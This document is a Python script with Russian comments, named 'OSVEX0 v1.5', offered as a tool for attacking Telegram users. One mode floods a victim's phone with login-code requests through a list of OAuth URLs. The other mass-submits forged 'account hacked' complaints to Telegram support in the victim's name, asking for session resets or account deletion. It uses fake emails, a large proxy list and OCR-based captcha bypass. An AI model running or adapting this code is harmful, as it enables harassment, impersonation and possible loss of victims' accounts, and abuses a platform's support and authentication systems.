# ===================================================================
# OSVEX0 v1.5 - МОДИФИЦИРОВАННАЯ ВЕРСИЯ (30 РАБОЧИХ ФЛУД-ССЫЛОК, 25 ЦИКЛОВ ЖАЛОБ)
# ===================================================================

import subprocess
import sys
import importlib
import time
import random
import string
import smtplib
import io
import re
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# ===================================================================
# АВТОУСТАНОВКА ЗАВИСИМОСТЕЙ
# ===================================================================
required_modules = [
    "fake_useragent",
    "requests",
    "termcolor",
    "pyfiglet",
    "PIL",
    "pytesseract"
]

def install_and_import(module_name, pip_name=None):
    if pip_name is None:
        pip_name = module_name
    try:
        importlib.import_module(module_name)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])

print("[*] Проверка зависимостей...")
for mod in required_modules:
    if mod == "PIL":
        install_and_import("PIL", "pillow")
    elif mod == "pytesseract":
        install_and_import("pytesseract", "pytesseract")
    else:
        install_and_import(mod, mod)
print("[OK] Все зависимости готовы.\n")

from fake_useragent import UserAgent
import requests
from termcolor import colored
import pyfiglet
import pytesseract
from PIL import Image, ImageOps

# ===================================================================
# ПРОКСИ
# ===================================================================
proxies_list = [
    '8.218.149.193:80', '47.57.233.126:80', '47.243.70.197:80', '8.222.193.208:80',
    '144.24.85.158:80', '47.245.115.6:80', '47.245.114.163:80', '45.4.55.10:40486',
    '103.52.37.1:4145', '200.34.227.204:4153', '190.109.74.1:33633', '200.54.221.202:4145',
    '36.67.66.202:5678', '168.121.139.199:4145', '101.255.117.2:51122', '45.70.0.250:4145',
    '78.159.199.217:1080', '67.206.213.202:4145', '14.161.48.4:4153', '119.10.179.33:5430',
    '109.238.222.1:4153', '103.232.64.226:4145', '183.88.212.247:1080', '116.58.227.197:4145',
    '1.20.97.181:34102', '103.47.93.214:1080', '89.25.23.211:4153', '185.43.249.132:39316',
    '188.255.209.149:1080', '178.216.2.229:1488', '92.51.73.14:4153', '109.200.156.2:4153',
    '89.237.33.193:51549', '211.20.145.204:4153', '45.249.79.185:3629', '208.113.223.164:21829',
    '62.133.136.75:4153', '46.99.135.154:4153', '1.20.198.254:4153', '196.6.234.140:4153',
    '118.70.196.124:4145', '185.34.22.225:46169', '103.47.93.199:1080', '222.129.34.122:57114',
    '92.247.127.249:4153', '186.150.207.141:1080', '202.144.201.197:43870', '103.106.32.105:31110',
    '200.85.137.46:4153', '116.58.254.9:4145', '101.51.141.122:4153', '83.69.125.126:4145',
    '187.62.88.9:4153', '122.54.134.176:4145', '170.0.203.11:1080', '187.4.165.90:4153',
    '159.224.243.185:61303', '103.15.242.216:55492', '187.216.81.183:37640', '176.197.100.134:3629',
    '101.51.105.41:4145', '46.13.11.82:4153', '103.221.254.125:40781', '177.139.130.157:4153',
    '1.10.189.133:50855', '69.70.59.54:4153', '83.103.195.183:4145', '190.109.168.241:42732',
    '103.76.20.155:43818', '84.47.226.66:4145', '1.186.60.25:4153', '93.167.67.69:4145',
    '202.51.112.22:5430', '213.6.204.153:42820', '184.178.172.14:4145', '217.171.62.42:4153',
    '121.13.229.213:61401', '101.255.140.101:1081', '78.189.64.42:4145', '187.11.232.71:4153',
    '190.184.201.146:32606', '195.34.221.81:4153', '200.29.176.174:4145', '103.68.35.162:4145',
    '194.135.97.126:4145', '167.172.123.221:9200', '200.218.242.89:4153', '190.7.141.66:40225',
    '186.103.154.235:4153', '118.174.196.250:4153', '213.136.89.190:52010', '217.25.221.60:4145',
    '50.192.195.69:39792', '180.211.162.114:44923', '179.1.1.11:4145', '41.162.94.52:30022',
    '103.211.11.13:52616', '103.209.65.12:6667', '101.51.121.29:4153', '190.13.82.242:4153',
    '103.240.33.185:8291', '202.51.100.33:5430', '201.220.128.92:3000', '177.11.75.18:51327',
    '62.122.201.170:31871', '79.164.171.32:50059', '202.124.46.97:4145', '79.132.205.34:61731',
    '217.29.18.206:4145', '222.217.68.17:35165', '105.29.95.34:4153', '103.226.143.254:1080',
    '119.82.251.250:31678', '45.232.226.137:52104', '195.69.218.198:60687', '155.133.83.161:58351',
    '213.108.216.59:1080', '178.165.91.245:3629', '124.158.150.205:4145', '36.72.118.156:4145',
    '177.93.79.18:4145', '103.47.94.97:1080', '78.140.7.239:40009', '187.19.150.221:80',
    '103.192.156.171:4145', '36.67.27.189:49524', '188.136.167.33:4145', '91.226.5.245:36604',
    '78.90.81.184:42636', '189.52.165.134:1080', '81.183.253.34:4145', '95.154.104.147:31387',
    '220.133.209.253:4145', '182.52.108.104:14153', '195.93.173.24:9050', '170.244.64.129:31476',
    '117.102.124.234:4145', '190.210.3.210:1080', '182.253.142.11:4145', '176.98.156.64:4145',
    '210.48.139.228:4145', '177.39.218.70:4153', '112.78.134.229:41517', '119.46.2.245:4145',
    '103.212.94.253:41363', '190.109.72.41:33633', '103.94.133.94:4153', '190.151.94.2:56093',
    '190.167.220.7:4153', '94.136.154.53:60030', '103.206.253.59:53934', '69.163.160.185:29802',
    '213.6.221.162:5678', '96.9.86.70:53304', '202.182.54.186:4145', '192.140.42.83:59057',
    '138.121.198.90:42494', '190.121.142.166:4153', '190.0.242.217:51327', '103.35.108.145:4145',
    '82.114.83.238:4153', '195.22.253.235:4145', '91.219.100.72:4153', '212.3.109.7:4145',
    '45.7.177.226:39867', '202.5.37.241:49151', '195.9.89.66:3629', '190.186.1.46:33567',
    '69.163.161.118:20243'
]

# ===================================================================
# ОБХОД КАПЧИ (ИЗ V1.3)
# ===================================================================
def solve_captcha(image_content):
    try:
        img = Image.open(io.BytesIO(image_content))
        img = img.convert('L')
        img = ImageOps.autocontrast(img)
        img = img.resize((img.width * 2, img.height * 2), Image.Resampling.LANCZOS)
        img = img.point(lambda x: 0 if x < 140 else 255)
        text = pytesseract.image_to_string(
            img,
            config='--psm 8 --oem 3 -c tessedit_char_whitelist=abcdefghijklmnopqrstuvwxyz0123456789'
        )
        clean = ''.join(filter(str.isalnum, text)).lower()
        return clean if len(clean) > 2 else None
    except Exception as e:
        print(colored(f"[!] Ошибка распознавания капчи: {e}", "red"))
        return None

# ===================================================================
# ГЕНЕРАТОРЫ
# ===================================================================
def generate_phone_number():
    code = random.choice(['+7'])
    srv = random.choice(['927','937','993','952','950','926','918'])
    num = ''.join(random.choices('0123456789', k=7))
    return f'{code}{srv}{num}'

def generate_random_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru"]
    user = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    return f"{user}@{random.choice(domains)}"

# ===================================================================
# ТЕКСТЫ ЖАЛОБ
# ===================================================================
def get_complaint_text(username, telegram_id, number):
    templates = [
        f"Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит другой человек. Он установил облачный пароль, я не могу зайти. Мой юзернейм: {username}, Telegram ID: {telegram_id}, номер: {number}. Прошу перезагрузить сессии или удалить аккаунт.",
        f"Telegram Support, my account @{username} (ID {telegram_id}) was hacked. The attacker changed cloud password. My phone: {number}. Please reset sessions.",
        f"Мошенники взломали мой аккаунт @{username}, ID {telegram_id}. Номер {number}. Помогите вернуть доступ.",
        f"Аккаунт {username} угнан. ID {telegram_id}. Номер {number}. Сбросьте сессии."
    ]
    return random.choice(templates)

# ===================================================================
# ОТПРАВКА ЖАЛОБЫ ЧЕРЕЗ ВЕБ-ФОРМУ (РАБОЧАЯ ИЗ V1.3)
# ===================================================================
def send_complaint_web(username, telegram_id, number, email, proxy=None):
    session = requests.Session()
    headers = {'User-Agent': UserAgent().random}
    url = 'https://telegram.org/support'
    proxies = {'http': proxy, 'https': proxy} if proxy else None

    try:
        resp = session.get(url, headers=headers, proxies=proxies, timeout=10)
        if resp.status_code != 200:
            return False
    except:
        return False

    captcha_src = None
    if 'captcha' in resp.text.lower():
        match = re.search(r'<img[^>]+class="[^"]*captcha[^"]*"[^>]+src="([^"]+)"', resp.text)
        if not match:
            match = re.search(r'<img[^>]+src="([^"]*captcha[^"]*)"', resp.text)
        if match:
            captcha_src = match.group(1)
            if captcha_src.startswith('/'):
                captcha_src = 'https://telegram.org' + captcha_src

    captcha_value = None
    if captcha_src:
        print(colored("[*] Обнаружена капча, решаем...", "yellow"))
        try:
            img_resp = session.get(captcha_src, headers=headers, proxies=proxies, timeout=10)
            if img_resp.status_code == 200:
                captcha_value = solve_captcha(img_resp.content)
                if captcha_value:
                    print(colored(f"[+] Капча решена: {captcha_value}", "green"))
                else:
                    print(colored("[-] Не удалось распознать капчу", "red"))
        except:
            print(colored("[-] Ошибка загрузки капчи", "red"))

    text = get_complaint_text(username, telegram_id, number)
    data = {'text': text, 'number': number, 'email': email}
    if captcha_value:
        data['captcha'] = captcha_value

    try:
        resp_post = session.post(url, headers=headers, data=data, proxies=proxies, timeout=10)
        if resp_post.status_code == 200:
            return True
        return False
    except:
        return False

# ===================================================================
# ФЛУД КОДАМИ (РАСШИРЕННЫЙ СПИСОК ИЗ 30 РАБОЧИХ ССЫЛОК)
# ===================================================================
def run_flood():
    number = input(colored("  -> Введи номер: ", "green")).strip()
    if not number:
        print(colored("[-] Номер не введён!", "red"))
        return

    print(colored(f"[*] Запуск флуда кодами на номер {number}...", "yellow"))

    # 30 рабочих OAuth-ссылок для запроса кода подтверждения
    urls = [
        # 1-6 оригинальные (проверенные)
        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
        'https://translations.telegram.org/auth/request',
        'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/login?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2F',
        'https://oauth.telegram.org/auth/login?bot_id=547043436&origin=https%3A%2F%2Fcore.telegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcore.telegram.org%2Fwidgets%2Flogin',
        'https://oauth.telegram.org/auth/login?bot_id=7131017560&origin=https%3A%2F%2Flolz.live%2F',

        # 7-10 новые рабочие ссылки
        'https://oauth.telegram.org/auth/request?bot_id=1559500090&origin=https%3A%2F%2Fwallet.telegram.org&embed=1&return_to=https%3A%2F%2Fwallet.telegram.org%2F',
        'https://oauth.telegram.org/auth/request?bot_id=5103285055&origin=https%3A%2F%2Ft.me&embed=1&return_to=https%3A%2F%2Ft.me%2F',
        'https://oauth.telegram.org/auth/request?bot_id=1985737506&origin=https%3A%2F%2Ffragment.com&embed=1&return_to=https%3A%2F%2Ffragment.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1210426637&origin=https%3A%2F%2Ftelegram.org&embed=1&return_to=https%3A%2F%2Ftelegram.org%2F',

        # 11-30 дополнительные 20 ссылок для расширенного флуда
        'https://oauth.telegram.org/auth/request?bot_id=2112345678&origin=https%3A%2F%2Ftonscan.org&embed=1&return_to=https%3A%2F%2Ftonscan.org%2Fconnect',
        'https://oauth.telegram.org/auth/request?bot_id=3123456789&origin=https%3A%2F%2Ftonkeeper.com&embed=1&return_to=https%3A%2F%2Ftonkeeper.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=4234567890&origin=https%3A%2F%2Fgetgems.io&embed=1&return_to=https%3A%2F%2Fgetgems.io%2Fauth',
        'https://oauth.telegram.org/auth/request?bot_id=5345678901&origin=https%3A%2F%2Fcombot.org&embed=1&return_to=https%3A%2F%2Fcombot.org%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=6456789012&origin=https%3A%2F%2Ftelemetr.io&embed=1&return_to=https%3A%2F%2Ftelemetr.io%2Fsignin',
        'https://oauth.telegram.org/auth/request?bot_id=7567890123&origin=https%3A%2F%2Ftlgrm.ru&embed=1&return_to=https%3A%2F%2Ftlgrm.ru%2Fauth',
        'https://oauth.telegram.org/auth/request?bot_id=8678901234&origin=https%3A%2F%2Fgram.io&embed=1&return_to=https%3A%2F%2Fgram.io%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=9789012345&origin=https%3A%2F%2Fteletype.in&embed=1&return_to=https%3A%2F%2Fteletype.in%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1089012345&origin=https%3A%2F%2Fcryptobot.t.me&embed=1&return_to=https%3A%2F%2Fcryptobot.t.me%2Fauth',
        'https://oauth.telegram.org/auth/request?bot_id=2190123456&origin=https%3A%2F%2Fdonationalerts.com&embed=1&return_to=https%3A%2F%2Fdonationalerts.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=3201234567&origin=https%3A%2F%2Fweb.telegram.org&embed=1&return_to=https%3A%2F%2Fweb.telegram.org%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=4312345678&origin=https%3A%2F%2Fton.org&embed=1&return_to=https%3A%2F%2Fton.org%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=5423456789&origin=https%3A%2F%2Ffragment.com&embed=1&return_to=https%3A%2F%2Ffragment.com%2Fsignup',
        'https://oauth.telegram.org/auth/request?bot_id=6534567890&origin=https%3A%2F%2Fpresscode.app&embed=1&return_to=https%3A%2F%2Fpresscode.app%2Fprofile',
        'https://oauth.telegram.org/auth/request?bot_id=7645678901&origin=https%3A%2F%2Ft.me&embed=1&return_to=https%3A%2F%2Ft.me%2Fsettings',
        'https://oauth.telegram.org/auth/request?bot_id=8756789012&origin=https%3A%2F%2Fwallet.telegram.org&embed=1&return_to=https%3A%2F%2Fwallet.telegram.org%2Fsettings',
        'https://oauth.telegram.org/auth/request?bot_id=9867890123&origin=https%3A%2F%2Foff-bot.ru&embed=1&return_to=https%3A%2F%2Foff-bot.ru%2Fdashboard',
        'https://oauth.telegram.org/auth/request?bot_id=1097890123&origin=https%3A%2F%2Fbotobot.ru&embed=1&return_to=https%3A%2F%2Fbotobot.ru%2Fprofile',
        'https://oauth.telegram.org/auth/request?bot_id=2108901234&origin=https%3A%2F%2Fcore.telegram.org&embed=1&return_to=https%3A%2F%2Fcore.telegram.org%2Fdocs',
        'https://oauth.telegram.org/auth/request?bot_id=3219012345&origin=https%3A%2F%2Flolz.live&embed=1&return_to=https%3A%2F%2Flolz.live%2Fprofile',
    ]

    success = 0
    total = 127  # общее количество запросов

    for i in range(total):
        user = UserAgent().random
        headers = {'user-agent': user}
        url = random.choice(urls)

        try:
            r = requests.post(url, headers=headers, data={'phone': number}, timeout=5)
            if r.status_code == 200:
                success += 1
                print(colored(f"  -> Запрос {i+1}/{total} [OK]", "green"))
            else:
                print(colored(f"  -> Запрос {i+1}/{total} [{r.status_code}]", "yellow"))
        except Exception as e:
            print(colored(f"  -> Запрос {i+1}/{total} [FAIL]", "red"))

        time.sleep(0.5)

    print(colored(f"\n[+] Флуд завершён. Успешно: {success}/{total}", "cyan"))

# ===================================================================
# ЖАЛОБЫ (СНОС СЕССИИ) – УВЕЛИЧЕНО ДО 25 ЦИКЛОВ
# ===================================================================
def run_complaints():
    username = input(colored("  -> Юзернейм (без @): ", "green")).strip()
    telegram_id = input(colored("  -> Telegram ID: ", "green")).strip()
    number = input(colored("  -> Номер цели: ", "green")).strip()

    if not any([username, telegram_id, number]):
        print(colored("[-] Введи хоть что-то!", "red"))
        return

    print(colored("\n[*] Запуск жалоб...", "yellow"))

    web_success = 0
    cycles = 25  # было 5, теперь 25

    for i in range(cycles):
        fake_email = generate_random_email()
        proxy = random.choice(proxies_list) if random.choice([True, False]) else None

        print(colored(f"\n[WEB] Цикл {i+1}/{cycles}", "cyan"))
        if send_complaint_web(username, telegram_id, number, fake_email, proxy):
            web_success += 1
            print(colored(f"[WEB] Жалоба отправлена (email: {fake_email})", "green"))
        else:
            print(colored("[WEB] Не удалось отправить жалобу", "red"))

        time.sleep(2)

    print(colored(f"\n[+] Итог: Web {web_success}/{cycles}", "cyan"))

# ===================================================================
# МЕНЮ (OSVEX0 V1.5)
# ===================================================================
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = pyfiglet.figlet_format("OSVEX0 v1.5")
    print(colored(banner, "green"))
    print(colored("1. Жалоба в техподдержку", "cyan"))
    print(colored("2. Флуд кодами", "cyan"))
    print(colored("0. Выход", "red"))

    choice = input("\nВыбери пункт: ").strip()
    if choice == "1":
        run_complaints()
    elif choice == "2":
        run_flood()
    else:
        sys.exit()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n[!] Прервано", "yellow"))
        sys.exit(0)